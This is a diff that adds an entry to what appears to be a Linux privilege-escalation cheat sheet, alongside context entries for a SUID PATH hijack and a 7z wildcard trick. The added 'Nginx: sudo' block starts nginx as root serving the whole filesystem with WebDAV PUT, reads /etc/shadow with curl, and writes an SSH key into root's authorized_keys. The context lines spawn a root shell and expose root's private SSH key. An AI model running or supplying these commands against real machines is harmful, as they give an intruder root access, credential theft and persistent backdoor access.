@@ -1390,6 +1390,12 @@ TARGET_SUID=/usr/local/bin/suid-name
 TARGET_BIN=tar
 TEMPFOLDER=$(mktemp -d); printf %s '/bin/bash -i' > $TEMPFOLDER/$TARGET_BIN; chmod +x $TEMPFOLDER/$TARGET_BIN; export PATH=$TEMPFOLDER:$PATH;$TARGET_SUID
 
++---------- Nginx: sudo ----------+
+echo -e 'user root;\nevents{\nworker_connections 1024;\n}\nhttp{\nserver{\nlisten 9999;\nroot /;\nautoindex on;\ndav_methods PUT;\n}\n}' >/tmp/nginx.conf
+(sudo /usr/sbin/nginx -c /tmp/nginx.conf &)
+curl localhost:9999/etc/shadow
+curl -X PUT localhost:9999/root/.ssh/authorized_keys -d 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIeeFWbnFWdAvY9w58uDcXbGb59vTldv4LnEkVgifJ7'
+
 +---------- 7z Wildcard ----------+
 touch @x; ln -fs /root/.ssh/id_rsa x
 sudo 7z_backup_script
